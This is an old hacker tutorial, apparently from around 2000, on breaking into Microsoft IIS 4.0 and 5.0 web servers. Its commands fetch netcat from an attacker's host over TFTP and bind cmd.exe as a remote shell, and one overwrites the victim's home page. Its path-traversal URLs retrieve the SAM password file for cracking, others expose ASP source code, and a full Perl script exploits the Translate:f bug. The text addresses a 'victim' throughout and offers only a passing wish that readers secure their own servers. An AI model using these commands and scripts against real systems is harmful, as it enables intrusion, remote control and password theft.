<P>01- Abstract</P>
<P></B></FONT>I am not sure what you want to get out of this but basically this 
paper is intended on breaking merely IIS web servers especially versions 4.0 and 
5.0 via TCP/IP over the port 80. This techniques works against even so-called 
secure networks just because every network even those secured ones lets HTTP 
connections in.</P><B><FONT size=4>
<P>=====================================================</P>
<P>02- Intro</P></B></FONT>
<P>Alright so you all wanna know how to break into IIS web servers? First off, 
you should find a cgi-scanner so that things will get easier. My personnel 
preferences are</P>
<P>"whisker" by "rain forest puppy" (www.wiretrip.net/rfp).</P>
<P>"cis" by "mnemonix" (www.cerberus-infosec.co.uk)</P>
<P>To understand which server is running on the victim site</P>
<P>telnet &lt;victim&gt; 80</P>
<P>GET HEAD / HTTP/1.0</P>
<P>and there you go with the name and the version of the web server. However 
some sites might run their web servers over 8080, 81, 8000, 8001, and so on.</P>
<P>To understand SSL web servers, which provides encryption between the web 
server and the browser we use the tool "ssleay"</P>
<P>s_client -connect &lt;victim&gt;:443</P>
<P>HEAD / HTTP /1.0</P>
<P>and here we go again. </P>
<P>As i am writing this i am hoping that you will be able to use this to secure 
your web servers instead of using this to break into others.</P><B><FONT size=4>
<P>=====================================================</P>
<P>03- Game Starts</P>
<P>========IIS HACK=====</P>
<P></B></FONT>The folks at www.eeye.com, have found a vulnerability on IIS 4.0 
which allows us to upload a crafted version of netcat (hacker's swiss army 
knife) onto victim server and binds a cmd.exe on port 80. </P>
<P>The vulnerabliy was a bufferoverflow in .htr .idc and .stm files. The problem 
is with insufficient bounds checking of the names in the URL for .htr .stm and 
.idc files, allowing hackers to insert some backdoors to download and execute 
arbitrary commands on the local system as the administrator user.</P>
<P>To hack the victim site we need </P>
<P>iishack.exe</P>
<P>ncx.exe (you can find these two at www.technotronic.com)</P>
<P>plus we need a web server running at our attacking box. </P>
<P></P>
<P>First off, run the web server on your attacking box and place the ncx.exe on 
your root directory.</P>
<P>then run iishack.exe against the victim site</P>
<P>c:\&gt;iishack.exe &lt;victim&gt; 80 &lt;evil_hacker&gt;/ncx.exe </P>
<P>Then here we go, go and get your swiss army knife, namely netcat,</P>
<P>c:\&gt;nc &lt;victim&gt; 80 ==============&gt;&gt;&gt;BOOM!</P>
<P>the command promt from the victim site suddenly appears on your box !!!</P>
<P>D:\&gt; or whatever it is , C;E;...</P>
<P>do you want me to xplain what to do next, hey common you must be kidding 
...hehe....</P>
<P>&nbsp;</P><B><FONT size=4>
<P>=========MDAC- Local Command Execution===========</P></B></FONT>
<P>You might think that it is a years-old vulnerability, however what i see on 
pen-tests is that almost 40% of IIS web servers are still vulnerable to this. 
</P>
<P>IIS' MDAC component has a vulnerability where an attacker can submit commands 
for local execution.</P>
<P>The core problem is with the RDS Datafactory. By default, it allows remote 
commands to be sent to the IIS server. The commands will be run as the effective 
user of the service, which is typically the SYSTEM user. </P>
<P>I wont get into details, if you want go and check RFP's web site. However, 
you can find a vulnerable site by checking</P>
<P>c:\&gt;nc -nw -w 2 &lt;victim&gt; 80</P>
<P>GET /msadc/msadcs.dll HTTP</P>
<P>and if you get the following</P>
<P>application/x_varg</P>
<P>it is most probably vulnerable if not patched.</P>
<P>You can find the exploit, mdac.pl and msadc2.pl from rain forest puppy's web 
site at www.wiretrip.net/rfp It checks for the vulnerability and if it is 
vulnerable then it asks for the command you wanna execute:</P>
<P>c:\&gt; mdac.pl -h &lt;victim&gt;</P>
<P>Please type the NT commandline you want to run (cmd /c assumed):\n</P>
<P>cmd /c </P>
<P>if you wanna change the web site which is located at 
d:\inetpub\wwwroot\victimweb\index.htm</P>
<P>then you can type:</P>
<P>cmd/c echo hacked by me &gt; d:\inetpub\wwwroot\victimweb\index.htm</P>
<P>or what ever you want but my personnal preference is uploading our swiss army 
knife, netcat, and binding it to the cmd.exe to the port 80. To do that i set up 
my TFTP server and put nc.exe in it. Then when i am asked to type the command i 
want to execute, i type the following:</P>
<P>cmd/c cd %systemroot%&amp;&amp;tftp -i &lt;evil_hacker&gt; GET 
nc.exe&amp;&amp;del ftptmp &amp;&amp; attrib -r nc.exe&amp;&amp;nc.exe -l -p 80 
-t -e cmd.exe</P>
<P>there you go, go on fire your netcat against the victim over port 80, you get 
the eggshell, cmd.exe.....</P>
<P>&nbsp;</P>
<P>=========<B><FONT size=4>Codebrws.asp &amp; Showcode.asp</B></FONT> 
==================</P>
<P>Codebrws.asp and Showcode.asp is a viewer file that ships with Microsoft IIS, 
but is</P>
<P>not installed by default. The viewer is intended to be installed by the 
administrator to allow for the viewing of sample files as a learning exercise; 
however, the viewer does not restrict what files can be accessed. A remote 
attacker can exploit this vulnerability to</P>
<P>view the contents of any file on the victim's server. However, there are 
several issues to be aware of:</P>
<P>1. Codebrws.asp and showcode.asp are not installed by default.</P>
<P>2. The vulnerability only allows for viewing of files.</P>
<P>3. The vulnerability does not bypass WindowsNT Access Control Lists</P>
<P>(ACLs).</P>
<P>4. Only files in the same disk partition can be viewed.</P>
<P>5. Attackers must know the location of the requested file.</P>
<P>Lets say you wanna see the code of codebrws.asp request the following from 
the from your favorite web browser,</P>
<P>http://www.victim.com/iisamples/exair/howitworks/codebrws.asp?source=/ 
iisamples/exair/howitworks/codebrws.asp</P>
<P>then you will see the source code of codebrws.asp</P>
<P>For using showcode.asp, do the following again from your infamous browser</P>
<P>http://www.victim.com/msadc/samples/selector/showcode.asp?source=/msadc/../../../../../winnt/repair/sam._</P>
<P>There you go, you get the infamous sam._ file, copy it, expand it and crack 
it using Lophtcrack, my personal choise, and you will get all user passwords 
even the administrator one.</P>
<P>=========<B><FONT size=4>Null.htw</B></FONT>===============</P>
<P>Microsoft IIS running with Index Server contains a vulnerability</P>
<P>through Null.htw even if no .htw files exist on the server. Thevulnerability 
displays the source code of an ASP page or otherrequested file. The ability to 
view ASP pages could provide sensitive information such as usernames and 
passwords. An attacker providing IIS with a malformed URL request could escape 
the virtual directory, providing access to the logical drive and root directory. 
The "hit-highlighting" function in the Index Server does not adequately restrain 
what types of files may be requested, allowing an attacker to</P>
<P>request any file on the server. Microsoft has released a patch for Windows 
2000 addressing this vulnerability.</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>Null.htw function has 3 variables which gets their inputs from the user. 
These variables are as follows</P>
<P>CiWebhitsfile</P>
<P>CiRestriction</P>
<P>CiHiliteType</P>
<P>Respectively.</P>
<P>Say that, we wanna see the source code of default.asp, the type the following 
from your favorite browser </P>
<P>http://www.victim.com/null.htw?CiWebhitsfile=/default.asp%20&amp;%20CiRestriction=none%20&amp;%20&amp;CiHiliteType=full</P>
<P>and you will get the source of default.asp file.</P>
<P>&nbsp;</P>
<P>========<B><FONT size=4>webhits.dll &amp; .htw</B></FONT>================</P>
<P>The hit-highligting functionality provided by Index Server allows a web user 
to have a document with their original search terms highlighted on the page. The 
name of the document is passed to .htw file with the CiWebhitsfile argument. 
Webhits.dll, the ISAPI Application that deals with the request, opens the file 
highlights accordingly and returns the resulting page. As the user has control 
of the CiWebhitsfile argument passed to the .htw file they can request anything 
they want. And the real problem is that, they can view the source of ASP and 
other scripted pages.</P>
<P>To unserstand you are vulnerable, request the following from the site</P>
<P>http://www.victim.com/nosuchfile.htw</P>
<P>if you get the following from the server</P>
<P>format of the QUERY_STRING is invalid</P>
<P>it means that you are vulnerable.</P>
<P>The problem is because of webhits.dll (an ISAPI Application) associated to 
.htw files. You can find the .htw files in the following locations of infamous 
IIS web server,</P>
<P>/iissamples/issamples/oop/qfullhit.htw</P>
<P>/iissamples/issamples/oop/qsumrhit.htw</P>
<P>/isssamples/exair/search/qfullhit.htw </P>
<P>/isssamples/exair/search/qsumrhit.htw</P>
<P>/isshelp/iss/misc/iirturnh.htw (this is normally for loopback)</P>
<P>An attacker, for instance view the contents of sam._ file as follows</P>
<P>http://www.victim.com/iissamples/issamples/oop/qfullhit.htw?ciwebhitsfile=/../../winnt/repair/sam._&amp;cirestriction=none&amp;cihilitetype=full</P>
<P>will reveal the contents of sam._ file, which is binary, you should copy it, 
expand it and crack it as i explained several times before.</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>===<B><FONT size=4>ASP Alternate Data 
Streams(::$DATA)==================</P></B></FONT>
<P>The $DATA vulnerability, published in mid-1998, results from an error</P>
<P>in the way the Internet Information Server parses file names. $DATA is an 
attribute of the main data stream (which holds the "primary content") stored 
within a file on NT File System (NTFS). By creating a specially constructed URL, 
it is possible to use IIS to access this data stream from a browser. Doing so 
will display the code of the file</P>
<P>containing that data stream and any data that file holds. This method can be 
used to display a script-mapped file that can normally be acted upon only by a 
particular Application Mapping. The contents of these files are not ordinarily 
available to users. However, in order to display the file, the file must reside 
on the NTFS partition and must</P>
<P>have ACLs set to allow at least read access; the unauthorized user must also 
know the file name. Microsoft Windows NT Server's IIS versions 1.0, 2.0, 3.0 and 
4.0 are affected by this vulnerability.</P>
<P>Microsoft has produced a hotfix for IIS versions 3.0 and 4.0. The fix</P>
<P>involves IIS "supporting NTFS alternate data streams by asking Windows</P>
<P>NT to make the file name canonical" according the Microsoft.</P>
<P>To view or get the source of an .asp code, type the following from your 
browser</P>
<P>http://www.victim.com/default.asp::$DATA</P>
<P>and you will get the source code. </P>
<P>&nbsp;</P><B><FONT size=4>
<P>=========ASP Dot Bug====================</P></B></FONT>
<P>The famous Lopht group has discovered the ASP dot bug in 1997. The 
vulnerability involved being able to reveal ASP source code to attackers. By 
appending one or more dots to the end of an ASP URL under IIS 3.0, it was 
possible to view the ASP source code.</P>
<P>The exploit worked by appending a dot the end of an ASP as follows</P>
<P>http://www.victim.com/sample.asp.</P><B><FONT size=4>
<P>======ISM.DLL Buffer Truncation===============</P>
<P></P>
<P></B></FONT>This bug was found by Cerberus Information Security team. It runs 
on IIS 4.0 and 5.0. that allows attackers to view the content of files and 
source code of scripts.</P>
<P>By making a specially formed request to IIS, with the name of the file and 
then appending around 230 + " %20 " (these represents spaces) and then appending 
" .htr " this tricks IIS into thinking that the client is requesting a " .htr " 
file . The .htr file extension is mapped to the ISM.DLL ISAPI Application and 
IIS redirects all requests for .htr rsources to this DLL.</P>
<P>ISM.DLL is then passed the name of the file to open and execute but before 
doing this ISM.DLL truncates the buffer sent to it chopping off the .htr and a 
few spaces and ends up opening the file we want to get source of. The contents 
are then returned.</P>
<P>This attack can only be launched once though., unless the web service started 
and stopped. It will only work when ISM.DLL first loaded into memory.</P>
<P>An attacker can view the source of global.asa, for instance, as follows</P>
<P>http://www.victim.com/global.asa%20%20(...&lt;=230)global.asa.htr</P>
<P>will reveal the source of global.asa</P><B><FONT size=4>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>==========.idc &amp; .ida Bugs=======================</P></B></FONT>
<P>This exploit, actually, similar to ASP dot bug, however this time we get the 
path of web directory on IIS 4.0. I have even seen this bug working on IIS 5.0 
on my pen-tests. By adding an ".idc" or ".ida" extension to the end of URL will 
cause IIS installations to try to run the so-called .IDC through the database 
connector .DLL. If the .idc doesnt exists, than it will return rather 
informative about the server.</P><FONT size=2>
<P></FONT>http://www.victim.com/anything.idc or anything.idq</P>
<P>you will get the path.</P><B><FONT size=4>
<P>============+.htr Bug===========================</P></FONT>
<P></B>This exploit is also ever so similar to dot asp bug and you can get the 
source code of ASA and ASP files by appending a +.htr to the URL of asp and asa 
files.</P>
<P>http://www.victim.com/global.asa+.htr</P>
<P>you<B> </B>may get the source code to browse</P><B><FONT size=4>
<P>===========NT Site Server Adsamples Vulnerability ======</P>
<P></B></FONT>By requesting site.csc, which is normally located in 
/adsamples/config/site.csc,</P>
<P>The attacker may be able to retrieve the DSN, UID and PASS of the database as 
this file may contain them.</P>
<P>By typing the following</P>
<P>http://www.victim.com/adsamples/config/site.csc</P>
<P>the attacker will download the file site.csc and (s)he can get some important 
data.</P><B><FONT size=4>
<P>&nbsp;</P>
<P>==========Password Attack to User Accounts===========</P>
<P></B></FONT>IIS 4.0 has an interesting feature that can allow a remote 
attacker to attack user accoounts local to the web server as well as other 
machines across to the internet. Added to this if your Web server is behind a 
firewall performing NAT (network address translation), machines on inside could 
be attacked as well.</P>
<P>By default every install of IIS 4.0 creates a virtual directory " /iisadmpwd 
". This directory contains a number of .htr files. Anonymous users are allowed 
to access this files, they are not restricted to loopback address(127.0.0.1). 
The following is a list of files found in the .iisadmpwd directory, which 
physically maps to c:\winnt\system32\inetsrv\iisadmpwd</P>
<P>Achg.htr</P>
<P>Aexp.htr</P>
<P>Aexp2.htr</P>
<P>Aexp2b.htr</P>
<P>Aexp3.htr</P>
<P>Aexp4.htr</P>
<P>Aexp4b.htr</P>
<P>Anot.htr</P>
<P>Anot3.htr</P>
<P>This files are pretty much of the same variants of the same file and allow a 
user to change their password via web. It can also be used to enumerate valid 
accounts through guess work.</P>
<P>If the user account does not exist, a message will be returned saying 
"invalid domain".</P>
<P>If the account exists, but the password is wrong then the message will say 
so.</P>
<P>If an IP address followed by a backslash precedes the account name then the 
IIS server will contact the remote machine, over the NetBIOS session port 139, 
and attempt to change to user’s password. (x.x.x.x\ACCOUNTNAME)</P>
<P>Therefore, if you do not need this service, remove the /iisadmpwd directory. 
This will prevent attackers.</P><B><FONT size=4>
<P>=============Translate:f Bug ====================</P></B></FONT>
<P>Daniel Docekal brought this issue in BugTraq this summer, August 15, 2000. 
(www.securityfocus.com/bid/1578) The actual problem is with the WebDAV 
implementation in office 2000 and FrontPage 2000 Server Extensions. </P>
<P>When someone makes a request for ASP/ASA or anyother scriptable page and adds 
"translate:f " into headers of HTTP GET (headers are not part of URL, part of 
HTTP request), then they are come up with complete ASP/ASA source code on Win2K 
SP1 not installed.</P>
<P>Translate:F is a legitimate header for WebDAV and is used in WebDAV 
compatible client and in FP2000 to get the file for editing.</P>
<P>Simple adding of "translate:f" and placing "/" at the end of request to HTTP 
GET will lead in security bug.</P>
<P>It is a Win2K bug, but due to FP2000 installed IIS4.00, it is also a IIS4.0 
bug.</P>
<P>You can use the following perl script to use this exploit.</P>
<P>#############################</P>
<P>use IO::Socket; #</P>
<P>my ($port, $sock,$server); #</P>
<P>$size=0; #</P>
<P>#############################</P>
<P>#</P>
<P>$server="$ARGV[0]";</P>
<P>$s="$server";</P>
<P>$port="80";</P>
<P>$cm="$ARGV[1]";</P>
<P>&amp;connect;</P>
<P>sub connect {</P>
<P>if ($#ARGV &lt; 1) {</P>
<P>howto();</P>
<P>exit;</P>
<P>}</P>
<P>$ver="GET /$cm%5C HTTP/1.0</P>
<P>Host: $server</P>
<P>Accept: */*</P>
<P>Translate: f</P>
<P>\n\n";</P>
<P>my($iaddr,$paddr,$proto);</P>
<P>$iaddr = inet_aton($server) || die "Error: $!";</P>
<P>$paddr = sockaddr_in($port, $iaddr) || die "Error: $!";</P>
<P>$proto = getprotobyname('tcp') || die "Error: $!";</P>
<P>socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die "Error:</P>
<P>$!";</P>
<P>connect(SOCK, $paddr) || die "Error: $!";</P>
<P>send(SOCK, $ver, 0) || die "Can't to send packet: $!";</P>
<P>open(OUT, "&gt;$server.txt");</P>
<P>print "Dumping $cm to $server.txt \n";</P>
<P>while(&lt;SOCK&gt;) {</P>
<P>print OUT &lt;SOCK&gt;;</P>
<P>}</P>
<P>sub howto {</P>
<P>print "type as follows: Trans.pl www.victim.com codetoview.asp \n\n";</P>
<P>}</P>
<P>close OUT;</P>
<P>$n=0;</P>
<P>$type=2;</P>
<P>close(SOCK);</P>
<P>exit(1);</P>
<P>}</P>
<P>If we call the script as translate.pl then we can get a ASA/ASP source code 
as follows</P>
<P>Trasn.pl www.victim.com codetoview.asp</P>
<P>And there you go, you get the source code of codeview.asp.</P>

<P>04- Conclusion</P></B></FONT>
<P>All the information i have given you has been widely used in wild. However 
what i tried to do was just to collect all these information together as to 
check the security of our famous IIS 4.0 and 5.0. Wheneveri encounter a IIS web 
server during my pen-tests, i do check for these vulnerabilities and most of the 
time one of these works.</P>
<P>I hope that, what i written was helped you in some way. Thanks for reading 
it, please continue to support me as i continue to release this sortta papers. 
If you wanna learn more, please check the mentioned people’s web sites for more 
details and you can even write to me.</P>
<P>Peace in mind</P>
<P>Watch your servers in wild</P>
